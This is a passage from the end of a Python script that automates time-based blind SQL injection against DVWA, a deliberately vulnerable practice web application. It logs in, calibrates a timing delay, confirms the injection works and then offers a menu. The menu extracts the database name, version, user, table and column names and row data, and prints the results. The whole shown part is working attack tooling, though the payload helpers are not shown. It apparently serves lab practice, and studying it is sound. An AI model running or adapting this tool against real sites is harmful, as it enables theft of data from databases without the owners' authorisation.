    total_time = time.time() - overall_start
    print(f"\n\n{Colors.BOLD}{'='*60}")
    print(f"  EXTRACTION COMPLETE — RESULTS")
    print(f"{'='*60}{Colors.RESET}")
    print(f"\n  ⏱️  Total time: {total_time:.1f}s ({total_time/60:.1f} minutes)")
    print(f"\n  📁 Database: {Colors.GREEN}{db_name}{Colors.RESET}")
    print(f"\n  📋 Schema:")
    for table, columns in schema.items():
        marker = "🎯" if table in data_results else "  "
        print(f"    {marker} Table: {Colors.CYAN}{table}{Colors.RESET}")
        for col in columns:
            print(f"          └── {col}")

    if data_results:
        print(f"\n  📊 Extracted Data:")
        for table, col_data in data_results.items():
            print(f"    Table: {Colors.CYAN}{table}{Colors.RESET}")
            for col, values in col_data.items():
                for i, val in enumerate(values):
                    print(f"      Row {i+1}: {col} = {Colors.GREEN}{val}{Colors.RESET}")

    return {
        "database": db_name,
        "tables": tables,
        "schema": schema,
        "data": data_results,
    }


# ──────────────────────────────────────────────────────────────
#  SECTION 8: MAIN
# ──────────────────────────────────────────────────────────────

def main():
    banner()

    # ═══ STEP 1: Auto-login to DVWA ═══
    session = dvwa_login()

    # ═══ STEP 2: Dynamic Delay Calculator ═══
    baseline_stats = measure_baseline(session)
    sleep_time, threshold = calculate_optimal_delay(baseline_stats)

    # ═══ STEP 3: Verify injection works ═══
    comment = verify_time_injection(session, sleep_time, threshold)
    if comment is None:
        print(f"\n{Colors.RED}❌ Cannot proceed — time-based injection not working.{Colors.RESET}")
        print(f"   Ensure DVWA security = Low and database is set up.")
        sys.exit(1)

    db_type = "mysql"  # DVWA uses MySQL

    # ═══ STEP 4: Interactive extraction ═══
    while True:
        print_menu()
        choice = input(f"    {Colors.BOLD}Enter choice [0-7]: {Colors.RESET}").strip()

        if choice == "0":
            print(f"\n    {Colors.CYAN}Goodbye! Stay ethical. 🛡️{Colors.RESET}\n")
            break

        elif choice == "1":
            name = extract_database_name(session, sleep_time, threshold,
                                          comment, db_type)
            print(f"\n    {Colors.GREEN}{Colors.BOLD}Database: {name}{Colors.RESET}")

        elif choice == "2":
            ver = extract_db_version(session, sleep_time, threshold,
                                      comment, db_type)
            print(f"\n    {Colors.GREEN}{Colors.BOLD}Version: {ver}{Colors.RESET}")

        elif choice == "3":
            user = extract_current_user(session, sleep_time, threshold,
                                         comment, db_type)
            print(f"\n    {Colors.GREEN}{Colors.BOLD}User: {user}{Colors.RESET}")

        elif choice == "4":
            tables = extract_table_names(session, sleep_time, threshold,
                                          comment, db_type)
            print(f"\n    {Colors.GREEN}Tables: {', '.join(tables)}{Colors.RESET}")

        elif choice == "5":
            table = input("    Enter table name: ").strip()
            if table:
                cols = extract_column_names(session, sleep_time, threshold,
                                             comment, table, db_type)
                print(f"\n    {Colors.GREEN}Columns in '{table}': "
                      f"{', '.join(cols)}{Colors.RESET}")

        elif choice == "6":
            table = input("    Enter table name: ").strip()
            column = input("    Enter column name: ").strip()
            if table and column:
                rows = extract_data(session, sleep_time, threshold, comment,
                                     table, column, db_type)
                print(f"\n    {Colors.GREEN}Data from {table}.{column}:{Colors.RESET}")
                for i, val in enumerate(rows):
                    print(f"      Row {i+1}: {val}")

        elif choice == "7":
            full_extraction(session, sleep_time, threshold, comment, db_type)

        else:
            print(f"    {Colors.RED}Invalid choice. Try again.{Colors.RESET}")


if __name__ == "__main__":
    main()